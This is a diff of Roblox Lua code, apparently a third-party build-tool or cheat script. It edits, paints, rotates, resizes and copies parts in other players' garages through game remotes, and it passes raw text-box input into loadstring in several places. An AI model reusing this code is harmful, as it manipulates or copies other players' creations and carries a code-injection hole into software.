-optionSelect.Position = UDim2.new(0, 0, 0.235294119, 0)
-optionSelect.Size = UDim2.new(0, 352, 0, 33)
-optionSelect.AutoButtonColor = false
-optionSelect.Font = Enum.Font.GothamSemibold
-optionSelect.Text = "  "..v
-optionSelect.TextColor3 = Color3.fromRGB(themeList.TextColor.r * 255 - 6, themeList.TextColor.g * 255 - 6, themeList.TextColor.b * 255 - 6)
-optionSelect.TextSize = 14.000
-optionSelect.TextXAlignment = Enum.TextXAlignment.Left
-optionSelect.ClipsDescendants = true
-optionSelect.MouseButton1Click:Connect(function()
-if not focusing then
-    opened = false
-    callback(v)
-    itemTextbox.Text = v
-    dropFrame:TweenSize(UDim2.new(0, 352, 0, 33), 'InOut', 'Linear', 0.08)
-    wait(0.1)
-    updateSectionFrame()
-    UpdateSize()
-    local c = sample1:Clone()
-    c.Parent = optionSelect
-    local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
-    c.Position = UDim2.new(0, x, 0, y)
-    local len, size = 0.35, nil
-    if optionSelect.AbsoluteSize.X >= optionSelect.AbsoluteSize.Y then
-        size = (optionSelect.AbsoluteSize.X * 1.5)
-    else
-        size = (optionSelect.AbsoluteSize.Y * 1.5)
-    end
-    c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
-    for i = 1, 10 do
-        c.ImageTransparency = c.ImageTransparency + 0.05
-        wait(len / 12)
-    end
-    c:Destroy()         
-else
-    for i,v in next, infoContainer:GetChildren() do
-        Utility:TweenObject(v, {Position = UDim2.new(0,0,2,0)}, 0.2)
-        focusing = false
-    end
-    Utility:TweenObject(blurFrame, {BackgroundTransparency = 1}, 0.2)
-end
 end)
 
-UICorner_2.CornerRadius = UDim.new(0, 4)
-UICorner_2.Parent = optionSelect
-
-local oHover = false
-optionSelect.MouseEnter:Connect(function()
-if not focusing then
-    game.TweenService:Create(optionSelect, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {
-        BackgroundColor3 = Color3.fromRGB(themeList.ElementColor.r * 255 + 8, themeList.ElementColor.g * 255 + 9, themeList.ElementColor.b * 255 + 10)
-    }):Play()
-    oHover = true
-end 
-end)
-optionSelect.MouseLeave:Connect(function()
-if not focusing then
-    game.TweenService:Create(optionSelect, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {
-        BackgroundColor3 = themeList.ElementColor
-    }):Play()
-    oHover = false
-end
-end)   
-coroutine.wrap(function()
-while wait() do
-    if not oHover then
-        optionSelect.BackgroundColor3 = themeList.ElementColor
+local PartEditor = PartEditorTab:NewSection("Edit Properties")
+local Transparency = PartEditor:NewTextBox("Transparency", "Edit transparency of parts", function(k)
+    for i, v in ipairs(PartsToEdit) do
+        FireRemote("transparency", v, k)
     end
-    optionSelect.TextColor3 = Color3.fromRGB(themeList.TextColor.r * 255 - 6, themeList.TextColor.g * 255 - 6, themeList.TextColor.b * 255 - 6)
-    Sample1.ImageColor3 = themeList.SchemeColor
-end
-end)()
-end
+end)
+local Reflectance = PartEditor:NewTextBox("Reflectance", "Edit reflectance of parts", function(k)
+    for i, v in ipairs(PartsToEdit) do
+        FireRemote("reflectance", v, k)
+    end
+end)
+local CanCollide = PartEditor:NewTextBox("Collision", "Edit collision of parts", function(k)
+    if k == "false" or k == "False" then
+        for i, v in ipairs(PartsToEdit) do
+            FireRemote("cancollide", v, false)
+        end
+    elseif k == "true" or k == "True" then
+        for i, v in ipairs(PartsToEdit) do
+            FireRemote("cancollide", v, true)
+        end
+    end
+end)
+local Size = PartEditor:NewTextBox("Size", "Edit size (x,y,z)", function(k)
+    newsize = true
+    assert(loadstring("newsize = Vector3.new(" .. k .. ")"))()
+    local newsize = newsize
+    for i, v in ipairs(PartsToEdit) do
+        FireRemote("resize", v, newsize, v.CFrame)
+    end
+end)
 
-function DropFunction:Refresh(newList)
-newList = newList or {}
-for i,v in next, dropFrame:GetChildren() do
-if v.Name == "optionSelect" then
-    v:Destroy()
-end
-end
-for i,v in next, newList do
-local optionSelect = Instance.new("TextButton")
-local UICorner_2 = Instance.new("UICorner")
-local Sample11 = Instance.new("ImageLabel")
-local ms = game.Players.LocalPlayer:GetMouse()
-Sample11.Name = "Sample11"
-Sample11.Parent = optionSelect
-Sample11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Sample11.BackgroundTransparency = 1.000
-Sample11.Image = "http://www.roblox.com/asset/?id=4560909609"
-Sample11.ImageColor3 = themeList.SchemeColor
-Sample11.ImageTransparency = 0.600
+-- Configure
+local PartConfigTab = Window:NewTab("Part Configurer")
+local ConfigSelect = PartConfigTab:NewSection("Select Parts")
+local PlayerConfig = ConfigSelect:NewDropdown("Player To Edit", "Select player's parts to edit",
+    {tostring(GetPlr(1)), tostring(GetPlr(2)), tostring(GetPlr(3)), tostring(GetPlr(4)), tostring(GetPlr(5)),
+     tostring(GetPlr(6)), tostring(GetPlr(7)), tostring(GetPlr(8)), tostring(GetPlr(9)), tostring(GetPlr(10))},
+    function(k)
+        PlayerToConfig = k
+    end)
+local ConfReq = ConfigSelect:NewTextBox("Reflectance Req", "Targets all parts with a set reflectance", function(k)
+    local Parts = GetGarage(PlayerToConfig).Parts:GetChildren()
+    local iterator = 1
+    for i, v in ipairs(Parts) do
+        if v.Reflectance > (k - 0.05) and v.Reflectance < (k + 0.05) then
+            PartsToConfig[iterator] = v
+            iterator = iterator + 1
+        end
+    end
+end)
+local ConfigParts = PartConfigTab:NewSection("Configure Parts")
+local ConfigName;
+local ConfigType;
+local ConfigValue
+ConfigParts:NewTextBox("Part Name", "Name of the part to config", function(k)
+    ConfigName = k
+end)
+ConfigParts:NewTextBox("Configure Type", "What to configure in the part", function(k)
+    ConfigType = k
+end)
+ConfigParts:NewTextBox("Configure Value", "vaue to configure to", function(k)
+    ConfigValue = k
+end)
+ConfigParts:NewButton("Confirm Configuration", "Configs parts selected", function()
+    for i, v in ipairs(PartsToConfig) do
+        FireRemote("Configure", ConfigName, ConfigType, v, tonumber(ConfigValue))
+    end
+end)
 
-local sample11 = Sample11
-DropYSize = DropYSize + 33
-optionSelect.Name = "optionSelect"
-optionSelect.Parent = dropFrame
-optionSelect.BackgroundColor3 = themeList.ElementColor
-optionSelect.Position = UDim2.new(0, 0, 0.235294119, 0)
-optionSelect.Size = UDim2.new(0, 352, 0, 33)
-optionSelect.AutoButtonColor = false
-optionSelect.Font = Enum.Font.GothamSemibold
-optionSelect.Text = "  "..v
-optionSelect.TextColor3 = Color3.fromRGB(themeList.TextColor.r * 255 - 6, themeList.TextColor.g * 255 - 6, themeList.TextColor.b * 255 - 6)
-optionSelect.TextSize = 14.000
-optionSelect.TextXAlignment = Enum.TextXAlignment.Left
-optionSelect.ClipsDescendants = true
-UICorner_2.CornerRadius = UDim.new(0, 4)
-UICorner_2.Parent = optionSelect
-optionSelect.MouseButton1Click:Connect(function()
-    if not focusing then
-        opened = false
-        callback(v)
-        itemTextbox.Text = v
-        dropFrame:TweenSize(UDim2.new(0, 352, 0, 33), 'InOut', 'Linear', 0.08)
-        wait(0.1)
-        updateSectionFrame()
-        UpdateSize()
-        local c = sample11:Clone()
-        c.Parent = optionSelect
-        local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
-        c.Position = UDim2.new(0, x, 0, y)
-        local len, size = 0.35, nil
-        if optionSelect.AbsoluteSize.X >= optionSelect.AbsoluteSize.Y then
-            size = (optionSelect.AbsoluteSize.X * 1.5)
+-- Painting
+local ColorTab = Window:NewTab("Painting")
+local ColorSelect = ColorTab:NewSection("Player Selection")
+local PlayerColor = ColorSelect:NewDropdown("Player To Build", "Select player's parts to build",
+    {tostring(GetPlr(1)), tostring(GetPlr(2)), tostring(GetPlr(3)), tostring(GetPlr(4)), tostring(GetPlr(5)),
+     tostring(GetPlr(6)), tostring(GetPlr(7)), tostring(GetPlr(8)), tostring(GetPlr(9)), tostring(GetPlr(10))},
+    function(k)
+        PlayerToBuild = k
+    end)
+local ColorTools = ColorTab:NewSection("Paint")
+ColorTools:NewTextBox("By Material", "Select parts with material specified", function(k)
+    local Parts = GetGarage(PlayerToBuild).Parts:GetChildren()
+    local iterator = 1
+    PartsToPaint = {}
+    material = true
+    assert(loadstring("material = Enum.Material." .. k))()
+    local material = material
+    for i, v in ipairs(Parts) do
+        if v.Material == material then
+            PartsToPaint[iterator] = v
+            iterator = iterator + 1
+        end
+    end
+end)
+ColorTools:NewTextBox("By Name", "Select parts with the same name", function(k)
+    local Parts = GetGarage(PlayerToBuild).Parts:GetChildren()
+    local iterator = 1
+    PartsToPaint = {}
+    for i, v in ipairs(Parts) do
+        if v.Name == k then
+            PartsToPaint[iterator] = v
+            iterator = iterator + 1
+        end
+    end
+end)
+ColorTools:NewTextBox("By Reflectance", "Select parts with the same name", function(k)
+    local Parts = GetGarage(PlayerToBuild).Parts:GetChildren()
+    local iterator = 1
+    PartsToPaint = {}
+    for i, v in ipairs(Parts) do
+        if v.Reflectance >= (k - 0.05) and v.Reflectance <= (k + 0.05) then
+            PartsToPaint[iterator] = v
+            iterator = iterator + 1
+        end
+    end
+end)
+ColorTools:NewColorPicker("Paint", "Paints with color picker", Color3.fromRGB(0, 0, 0), function(k)
+    for i, v in ipairs(PartsToPaint) do
+        FireRemote("paint", v, k)
+    end
+end)
+ColorTools:NewButton("Autopaint Magnets", "Instant Lasers", function()
+    local Parts = GetGarage(PlayerToBuild).Parts:GetChildren()
+    local m = 1
+    local n = 1
+    local newparts1 = {}
+    local newparts2 = {}
+    -- Define a custom comparison function
+    for i, v in pairs(Parts) do
+        if v.Name == "Negative Magnet V2" then
+            newparts1[m] = v
+            m = m + 1
+        end
+        if v.Name == "Positive Magnet" then
+            newparts2[n] = v
+            n = n + 1
+        end
+    end
+    function Comp(a, b)
+        return a.Position.Z < b.Position.Z
+    end
+    table.sort(newparts1, Comp)
+    table.sort(newparts2, Comp)
+    local paint
+    for i, v in pairs(newparts1) do
+        paint = Color3.new(1, 1, i / 200)
+        FireRemote("paint", v, paint)
+        FireRemote("Configure", "Magnet", "CustomSnapOption", v, 69420)
+        FireRemote("Configure", "Magnet", "DetectionRange", v, 69420)
+        FireRemote("Configure", "Magnet", "ScaleSnapOption", v, false)
+    end
+    for i, v in pairs(newparts2) do
+        paint = Color3.new(1, 1, (i + 1) / 200)
+        FireRemote("paint", v, paint)
+    end
+end)
+
+-- Group Actions
+do
+local degrees = 180
+local Rotate = {}
+local CenterDistanceX = {}
+local CenterDistanceZ = {}
+local m = 1
+local Plane
+local locked = 0
+function RotateBuild(angle)
+    plrother = true
+    assert(loadstring('plrother = game:GetService("Players").' .. PlayerToRotate))()
+    local plrother = plrother
+    local SurfaceNames = {"Top", "Back", "Left", "Right", "Bottom", "Front"}
+    function GetPlayer(PlrS)
+        if PlrS == "me" then
+            return game.Players.LocalPlayer
+        end
+        for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+            if string.lower(tostring(v):sub(1, string.len(PlrS))) == string.lower(PlrS) or
+                string.lower(v.DisplayName:sub(1, string.len(PlrS))) == string.lower(PlrS) then
+                return v
+            end
+        end
+    end
+    function GetPropertys(Part, ToClone)
+        if Part:FindFirstChild("BeltSpeed") then
+            FireRemote("Configure", "Conveyor", "Function", Part, ToClone.Function.Value)
+            FireRemote("Configure", "Conveyor", "BeltSpeed", Part, ToClone.BeltSpeed.Value)
+        elseif Part:FindFirstChild("ParticleEmitter") then
+            local PE = ToClone.ParticleEmitter
+            FireRemote("Configure", "PEmitter", "Acceleration", Part, PE.Acceleration)
+            FireRemote("Configure", "PEmitter", "Size", Part, PE.Size)
+            FireRemote("Configure", "PEmitter", "Lifetime", Part, PE.Lifetime)
+            FireRemote("Configure", "PEmitter", "Speed", Part, PE.Speed)
+            FireRemote("Configure", "PEmitter", "Rate", Part, PE.Rate)
+            FireRemote("Configure", "PEmitter", "Color", Part, PE.Color)
+            FireRemote("Configure", "PEmitter", "Texture", Part, PE.Texture, string.split(PE.Texture, "//")[2])
+            FireRemote("Configure", "PEmitter", "LockedToPart", Part, PE.LockedToPart)
+        elseif Part:FindFirstChild("BodyThrust") then
+            FireRemote("Configure", "Thruster", "MaxThrust", Part, ToClone.BodyThrust.Force)
+        elseif Part:FindFirstChild("SeatTorque") then
+            FireRemote("Configure", "Driver Seat", "CameraLock", Part, ToClone.CameraLock.Value)
+            FireRemote("Configure", "Driver Seat", "SeatSpeed", Part, ToClone.SeatSpeed.Value)
+            FireRemote("Configure", "Driver Seat", "SeatTorque", Part, ToClone.SeatTorque.Value)
+        elseif Part.Name == "TorqueBlock" then
+            FireRemote("Configure", "TorqueBlock", "Torque", Part, ToClone.Torque.Value) -- Broken idk why
+        elseif Part:FindFirstChild("Trail") then
+            FireRemote("Configure", "TrialPart", "ID", Part, ToClone.WHATTOCONFIG.Value)
+        elseif Part:FindFirstChild("Texture") then
+            FireRemote("Configure", "TexturePart", "TileStuds", Part, ToClone.TileStuds.Value)
+            FireRemote("Configure", "TexturePart", "Identifier", Part, ToClone.Identifier.Value)
+        elseif Part:FindFirstChild("VectorBlock") then
+            FireRemote("Configure", "GravityBlock", "Force", Part, ToClone.Force.Value)
+        elseif Part:FindFirstChild("RotForce") then
+            FireRemote("Configure", "MomentumDrag", "DirForce", Part, ToClone.DirForce.Value)
+            FireRemote("Configure", "MomentumDrag", "RotForce", Part, ToClone.RotForce.Value)
+        elseif Part:FindFirstChild("HoverHeight") then
+            FireRemote("Configure", "Hover", "HoverHeight", Part, ToClone.HoverHeight.Value)
+        elseif Part:FindFirstChild("Sound") then
+            FireRemote("Configure", "SoundPart", "Loop", Part, ToClone.Loop.Value)
+            FireRemote("Configure", "SoundPart", "Identifier", Part, ToClone.Identifier.Value)
+        elseif Part:FindFirstChild("Delay") then
+            FireRemote("Configure", "Fuse", "Delay", Part, ToClone.Delay.Value)
+        elseif Part:FindFirstChild("BoosterOption") then
+            FireRemote("Configure", "Booster", "BoosterOption", Part, ToClone.BoosterOption.Value)
+        elseif Part:FindFirstChild("SpringConstraint") then
+            FireRemote("Configure", "SpringA", "Length", Part, ToClone.SpringConstraint.MaxLength)
+            FireRemote("Configure", "SpringA", "FreeLength", Part, ToClone.SpringConstraint.FreeLength)
+        elseif Part:FindFirstChild("WFriction") then
+            FireRemote("Configure", "Wheel", "Friction", Part, ToClone.WFriction.Value)
+            FireRemote("Configure", "Wheel", "Elastic", Part, ToClone.WElasticity.Value)
+        elseif Part:FindFirstChild("PBlast") then
+            FireRemote("Configure", "PressureBomb", "PBlast", Part, ToClone.PBlast.Value)
+        elseif Part:FindFirstChild("CustomSnapOption") then
+            FireRemote("Configure", "Magnet", "CustomSnapOption", Part, 69420)
+            FireRemote("Configure", "Magnet", "DetectionRange", Part, 69420)
+            FireRemote("Configure", "Magnet", "MagnetForce", Part, ToClone.MagnetForce.Value)
+            FireRemote("Configure", "Magnet", "ScaleSnapOption", Part, ToClone.ScaleSnapOption.Value)
+
         else
-            size = (optionSelect.AbsoluteSize.Y * 1.5)
+            for i, v in pairs(Part:GetChildren()) do
+                if pcall(function()
+                    return v.Value
+                end) then
+                    FireRemote("Configure", tostring(Part), tostring(v), v.Value)
+                end
+            end
         end
-        c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
-        for i = 1, 10 do
-            c.ImageTransparency = c.ImageTransparency + 0.05
-            wait(len / 12)
-        end
-        c:Destroy()         
-    else
-        for i,v in next, infoContainer:GetChildren() do
-            Utility:TweenObject(v, {Position = UDim2.new(0,0,2,0)}, 0.2)
-            focusing = false
-        end
-        Utility:TweenObject(blurFrame, {BackgroundTransparency = 1}, 0.2)
     end
+    function CloneGarage(Plr)
+        MyGarage = true
+        assert(loadstring('MyGarage = GetGarage(game:GetService("Players").' .. PlayerToRotate .. ')'))()
+        local MyGarage = MyGarage
+        local MyBase = MyGarage.BuildZone
+        local MyParts = MyGarage.Parts
+        local PlrGarage = GetGarage(GetPlayer(Plr))
+        local Keybinds = {}
+        for i, v in pairs(PlrGarage.Keybinds:GetChildren()) do
+            Keybinds[tostring(v)] = v.BindName.Value
+        end
+        local PlrParts = PlrGarage.Parts:Clone()
+        local PlrBase = PlrGarage.BuildZone
+        local CopyProperties = {}
+
+        local groups = {
+            [1] = {},
+            [2] = {},
+            [3] = {}
+        }
+        local Count = 0
+        local MaxCount = 0
+        local Con = MyParts.ChildAdded:connect(function(Ch)
+            wait(4)
+            for i = 1, #CopyProperties do
+                if not CopyProperties[i]["Done"] and tostring(Ch) == CopyProperties[i][2].Name and
+                    (CopyProperties[i][1].Position - (Ch.Position - MyBase.Position)).Magnitude <= 0.001 then
+                    CopyProperties[i]["Done"] = true
+                    FireRemote("resize", Ch, CopyProperties[i][2].Size, Ch.CFrame) -- ToolController
+                    FireRemote("paint", Ch, CopyProperties[i][2].Color)
+                    print(CopyProperties[i][2].Color) -- ToolController
+                    FireRemote("material", Ch, CopyProperties[i][2].Material) -- ToolController
+                    FireRemote("cancollide", Ch, CopyProperties[i][2].CanCollide) -- ToolController
+                    FireRemote("transparency", Ch, CopyProperties[i][2].Transparency) -- ToolController
+                    FireRemote("reflectance", Ch, CopyProperties[i][2].Reflectance) -- ToolController
+                    for a = 1, #SurfaceNames do
+                        FireRemote("surface", Ch, SurfaceNames[a] .. "Surface",
+                            CopyProperties[i][2][SurfaceNames[a] .. "Surface"])
+                    end
+                    pcall(function()
+                        GetPropertys(Ch, CopyProperties[i][2])
+                    end)
+                    if CopyProperties[i][2]:FindFirstChild("KeyLabel") then
+                        local L = CopyProperties[i][2]:FindFirstChild("KeyLabel")
+                        FireRemote("keybind", L.Key.Text, L.Action.Text, Keybinds[L.Key.Text], Ch)
+                    end
+                    if Ch:FindFirstChild("Switch") then
+                        FireRemote("Configure", tostring(Ch), "Switch", Ch, CopyProperties[i][2].Switch.Value)
+                    end
+
+                    if Ch:FindFirstChild("Group") then
+                        table.insert(groups[CopyProperties[i][2].Group.Value], Ch)
+                    end
+                    break
+                end
+            end
+            Count = Count + 1
+        end)
+
+        m = 1
+        for i, v in pairs(Rotate) do
+            if v:IsA("BasePart") then
+                task.wait();
+                local LocalAngle = (math.atan(CenterDistanceZ[m] / CenterDistanceX[m]))
+                local Hype = (math.sqrt(CenterDistanceX[m] ^ 2 + CenterDistanceZ[m] ^ 2))
+                local distanceZ = Hype * (math.sin(math.pi - (math.rad(angle) + LocalAngle)))
+                local distanceX = Hype * (math.cos(math.pi - (math.rad(angle) + LocalAngle)))
+                local CF = (v.CFrame - PlrBase.Position + Vector3.new(CenterDistanceX[m], 0, CenterDistanceZ[m]) +
+                               Vector3.new(distanceX, 0, -distanceZ))
+                local RotCF = CFrame.Angles(0, math.rad(angle), 0):ToObjectSpace(CF)
+                local Offset = CFrame.fromMatrix(CF.Position, RotCF.XVector, RotCF.YVector, RotCF.ZVector)
+                table.insert(CopyProperties, {Offset, v:Clone()})
+                FireRemote("Insert", tostring(v), (Offset + MyBase.Position))
+                MaxCount = MaxCount + 1
+                m = m + 1
+            end
+        end
+        repeat
+            wait()
+        until MaxCount == Count
+        for i = 1, 3 do
+            FireRemote("grouping", groups[i], i)
+        end
+        Con:Disconnect()
+    end
+    CloneGarage(PlayerToRotate)
+end
+local RotateTab = Window:NewTab("Rotation")
+local RotateSelector = RotateTab:NewSection("Player Selection")
+local PlayerRotate = RotateSelector:NewDropdown("Player To Build", "Select player",
+    {tostring(GetPlr(1)), tostring(GetPlr(2)), tostring(GetPlr(3)), tostring(GetPlr(4)), tostring(GetPlr(5)),
+     tostring(GetPlr(6)), tostring(GetPlr(7)), tostring(GetPlr(8)), tostring(GetPlr(9)), tostring(GetPlr(10))},
+    function(k)
+        PlayerToRotate = k
+    end)
+local RotateSection = RotateTab:NewSection("Rotation")
+RotateSection:NewButton("Lock Parts", "Lock parts for rotation", function()
+    Rotate = {}
+    CenterDistanceX = {}
+    CenterDistanceZ = {}
+
+    Plane = GetGarage(PlayerToRotate).Parts:FindFirstChild("Laser Pointer")
+    for i, v in pairs(GetGarage(PlayerToRotate).Parts:GetChildren()) do
+        if v.Position.X < Plane.Position.X then
+            Rotate[m] = v
+            CenterDistanceX[m] = (Plane.Position.X - v.Position.X)
+            CenterDistanceZ[m] = (Plane.Position.Z - v.Position.Z)
+            m = m + 1
+        end
+    end
+end) 
+RotateSection:NewTextBox("Rotation By Angle", "Angle of rotation (Degrees)", function(k)
+    degrees = k
+    locked = degrees
 end)
-                updateSectionFrame()
-UpdateSize()
-local hov = false
-optionSelect.MouseEnter:Connect(function()
-    if not focusing then
-        game.TweenService:Create(optionSelect, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {
-            BackgroundColor3 = Color3.fromRGB(themeList.ElementColor.r * 255 + 8, themeList.ElementColor.g * 255 + 9, themeList.ElementColor.b * 255 + 10)
-        }):Play()
-        hov = true
+RotateSection:NewTextBox("Rotate By Tangent", "Opposite and Adjacent", function(k)
+    local x, y = string.match(k, "(%w+),(%w+)")
+    print(x, y)
+    degrees = math.deg(math.atan(x / y))
+    print(degrees)
+    locked = degrees
+end)
+RotateSection:NewButton("Rotate", "Rotate Build", function()
+    RotateBuild(degrees)
+    degrees = degrees + locked
+end)
+end
+
+do
+local Scale = 2
+local Resize = {}
+local CenterDistanceX = {}
+local CenterDistanceZ = {}
+local CenterDistanceY = {}
+local m = 1
+local Plane
+function ResizeBuild(scale)
+    plrother = true
+    assert(loadstring('plrother = game:GetService("Players").' .. PlayerToResize))()
+    local plrother = plrother
+    local SurfaceNames = {"Top", "Back", "Left", "Right", "Bottom", "Front"}
+    function GetPlayer(PlrS)
+        if PlrS == "me" then
+            return game.Players.LocalPlayer
+        end
+        for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+            if string.lower(tostring(v):sub(1, string.len(PlrS))) == string.lower(PlrS) or
+                string.lower(v.DisplayName:sub(1, string.len(PlrS))) == string.lower(PlrS) then
+                return v
+            end
+        end
+    end
+    function GetPropertys(Part, ToClone)
+        if Part:FindFirstChild("BeltSpeed") then
+            FireRemote("Configure", "Conveyor", "Function", Part, ToClone.Function.Value)
+            FireRemote("Configure", "Conveyor", "BeltSpeed", Part, ToClone.BeltSpeed.Value)
+        elseif Part:FindFirstChild("ParticleEmitter") then
+            local PE = ToClone.ParticleEmitter
+            FireRemote("Configure", "PEmitter", "Acceleration", Part, PE.Acceleration)
+            FireRemote("Configure", "PEmitter", "Size", Part, PE.Size)
+            FireRemote("Configure", "PEmitter", "Lifetime", Part, PE.Lifetime)
+            FireRemote("Configure", "PEmitter", "Speed", Part, PE.Speed)
+            FireRemote("Configure", "PEmitter", "Rate", Part, PE.Rate)
+            FireRemote("Configure", "PEmitter", "Color", Part, PE.Color)
+            FireRemote("Configure", "PEmitter", "Texture", Part, PE.Texture, string.split(PE.Texture, "//")[2])
+            FireRemote("Configure", "PEmitter", "LockedToPart", Part, PE.LockedToPart)
+        elseif Part:FindFirstChild("BodyThrust") then
+            FireRemote("Configure", "Thruster", "MaxThrust", Part, ToClone.BodyThrust.Force)
+        elseif Part:FindFirstChild("SeatTorque") then
+            FireRemote("Configure", "Driver Seat", "CameraLock", Part, ToClone.CameraLock.Value)
+            FireRemote("Configure", "Driver Seat", "SeatSpeed", Part, ToClone.SeatSpeed.Value)
+            FireRemote("Configure", "Driver Seat", "SeatTorque", Part, ToClone.SeatTorque.Value)
+        elseif Part.Name == "TorqueBlock" then
+            FireRemote("Configure", "TorqueBlock", "Torque", Part, ToClone.Torque.Value) -- Broken idk why
+        elseif Part:FindFirstChild("Trail") then
+            FireRemote("Configure", "TrialPart", "ID", Part, ToClone.WHATTOCONFIG.Value)
+        elseif Part:FindFirstChild("Texture") then
+            FireRemote("Configure", "TexturePart", "TileStuds", Part, ToClone.TileStuds.Value)
+            FireRemote("Configure", "TexturePart", "Identifier", Part, ToClone.Identifier.Value)
+        elseif Part:FindFirstChild("VectorBlock") then
+            FireRemote("Configure", "GravityBlock", "Force", Part, ToClone.Force.Value)
+        elseif Part:FindFirstChild("RotForce") then
+            FireRemote("Configure", "MomentumDrag", "DirForce", Part, ToClone.DirForce.Value)
+            FireRemote("Configure", "MomentumDrag", "RotForce", Part, ToClone.RotForce.Value)
+        elseif Part:FindFirstChild("HoverHeight") then
+            FireRemote("Configure", "Hover", "HoverHeight", Part, ToClone.HoverHeight.Value)
+        elseif Part:FindFirstChild("Sound") then
+            FireRemote("Configure", "SoundPart", "Loop", Part, ToClone.Loop.Value)
+            FireRemote("Configure", "SoundPart", "Identifier", Part, ToClone.Identifier.Value)
+        elseif Part:FindFirstChild("Delay") then
+            FireRemote("Configure", "Fuse", "Delay", Part, ToClone.Delay.Value)
+        elseif Part:FindFirstChild("BoosterOption") then
+            FireRemote("Configure", "Booster", "BoosterOption", Part, ToClone.BoosterOption.Value)
+        elseif Part:FindFirstChild("SpringConstraint") then
+            FireRemote("Configure", "SpringA", "Length", Part, ToClone.SpringConstraint.MaxLength)
+            FireRemote("Configure", "SpringA", "FreeLength", Part, ToClone.SpringConstraint.FreeLength)
+        elseif Part:FindFirstChild("WFriction") then
+            FireRemote("Configure", "Wheel", "Friction", Part, ToClone.WFriction.Value)
+            FireRemote("Configure", "Wheel", "Elastic", Part, ToClone.WElasticity.Value)
+        elseif Part:FindFirstChild("PBlast") then
+            FireRemote("Configure", "PressureBomb", "PBlast", Part, ToClone.PBlast.Value)
+        elseif Part:FindFirstChild("CustomSnapOption") then
+            FireRemote("Configure", "Magnet", "CustomSnapOption", Part, 69420)
+            FireRemote("Configure", "Magnet", "DetectionRange", Part, 69420)
+            FireRemote("Configure", "Magnet", "MagnetForce", Part, ToClone.MagnetForce.Value)
+            FireRemote("Configure", "Magnet", "ScaleSnapOption", Part, ToClone.ScaleSnapOption.Value)
+
+        else
+            for i, v in pairs(Part:GetChildren()) do
+                if pcall(function()
+                    return v.Value
+                end) then
+                    FireRemote("Configure", tostring(Part), tostring(v), v.Value)
+                end
+            end
+        end
+    end
+    function CloneGarage(Plr)
+        MyGarage = true
+        assert(loadstring('MyGarage = GetGarage(game:GetService("Players").' .. PlayerToResize .. ')'))()
+        local MyGarage = MyGarage
+        local MyBase = MyGarage.BuildZone
+        local MyParts = MyGarage.Parts
+        local PlrGarage = GetGarage(GetPlayer(Plr))
+        local Keybinds = {}
+        for i, v in pairs(PlrGarage.Keybinds:GetChildren()) do
+            Keybinds[tostring(v)] = v.BindName.Value
+        end
+        local PlrParts = PlrGarage.Parts:Clone()
+        local PlrBase = PlrGarage.BuildZone
+        local CopyProperties = {}
+
+        local groups = {
+            [1] = {},
+            [2] = {},
+            [3] = {}
+        }
+        local Count = 0
+        local MaxCount = 0
+        local Con = MyParts.ChildAdded:connect(function(Ch)
+            wait(4)
+            for i = 1, #CopyProperties do
+                if not CopyProperties[i]["Done"] and tostring(Ch) == CopyProperties[i][2].Name and
+                    (CopyProperties[i][1].Position - (Ch.Position - MyBase.Position)).Magnitude <= 0.001 then
+                    CopyProperties[i]["Done"] = true
+                    FireRemote("resize", Ch, CopyProperties[i][2].Size*scale, Ch.CFrame) -- ToolController
+                    FireRemote("paint", Ch, CopyProperties[i][2].Color)
+                    FireRemote("material", Ch, CopyProperties[i][2].Material) -- ToolController
+                    FireRemote("cancollide", Ch, CopyProperties[i][2].CanCollide) -- ToolController
+                    FireRemote("transparency", Ch, CopyProperties[i][2].Transparency) -- ToolController
+                    FireRemote("reflectance", Ch, CopyProperties[i][2].Reflectance) -- ToolController
+                    for a = 1, #SurfaceNames do
+                        FireRemote("surface", Ch, SurfaceNames[a] .. "Surface",
+                            CopyProperties[i][2][SurfaceNames[a] .. "Surface"])
+                    end
+                    pcall(function()
+                        GetPropertys(Ch, CopyProperties[i][2])
+                    end)
+                    if CopyProperties[i][2]:FindFirstChild("KeyLabel") then
+                        local L = CopyProperties[i][2]:FindFirstChild("KeyLabel")
+                        FireRemote("keybind", L.Key.Text, L.Action.Text, Keybinds[L.Key.Text], Ch)
+                    end
+                    if Ch:FindFirstChild("Switch") then
+                        FireRemote("Configure", tostring(Ch), "Switch", Ch, CopyProperties[i][2].Switch.Value)
+                    end
+
+                    if Ch:FindFirstChild("Group") then
+                        table.insert(groups[CopyProperties[i][2].Group.Value], Ch)
+                    end
+                    break
+                end
+            end
+            Count = Count + 1
+        end)
+
+    m = 1
+    for i, v in pairs(Resize) do
+    if v:IsA("BasePart") then
+    task.wait();
+    local distanceX = CenterDistanceX[m]*scale
+    local distanceY = CenterDistanceY[m]*scale
+    local distanceZ = CenterDistanceZ[m]*scale
+
+            local CF = (v.CFrame - PlrBase.Position  + Vector3.new(CenterDistanceX[m],CenterDistanceY[m],CenterDistanceZ[m])+ Vector3.new(-distanceX,-distanceY,-distanceZ))
+            local Offset = CF
+            table.insert(CopyProperties, {Offset, v:Clone()})
+            FireRemote("Insert", tostring(v), (Offset + MyBase.Position))
+            MaxCount = MaxCount + 1
+            m=m+1
+        end
+    end
+    repeat
+        wait()
+    until MaxCount == Count
+    for i = 1, 3 do
+        FireRemote("grouping", groups[i], i)
+    end
+    Con:Disconnect()
+end
+    CloneGarage(PlayerToResize)
+end
+local ResizeTab = Window:NewTab("Resize")
+local ResizeSelector = ResizeTab:NewSection("Player Selection")
+local PlayerResize = ResizeSelector:NewDropdown("Player To Build", "Select player",
+    {tostring(GetPlr(1)), tostring(GetPlr(2)), tostring(GetPlr(3)), tostring(GetPlr(4)), tostring(GetPlr(5)),
